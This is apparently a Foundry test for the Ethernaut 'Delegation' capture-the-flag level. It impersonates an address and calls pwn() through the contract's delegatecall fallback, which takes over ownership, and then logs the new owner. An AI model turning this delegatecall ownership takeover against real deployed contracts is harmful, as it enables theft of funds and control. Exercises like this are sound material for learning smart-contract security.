pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Delegation, Delegate} from "../src/06-delegate.sol";

contract Delegate06Test is Test {
    Delegation dlgation;
    Delegate dlg;

    function setUp() public {
        emit log_string("🧪 Setup DelegationTest...");
        dlg = new Delegate(address(this));
        dlgation = new Delegation(address(dlg));
        emit log_named_address(
            "The owner of delegation is: ",
            dlgation.owner()
        );
    }

    function testDelegate() public {
        emit log_string("🧪 Cracking Delegation...");
        address bob = mkaddr("bob");
        vm.startPrank(bob);

        (bool success, ) = address(dlgation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
        vm.stopPrank();
        emit log_named_address(
            "The owner of delegation is changed to: ",
            dlgation.owner()
        );
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
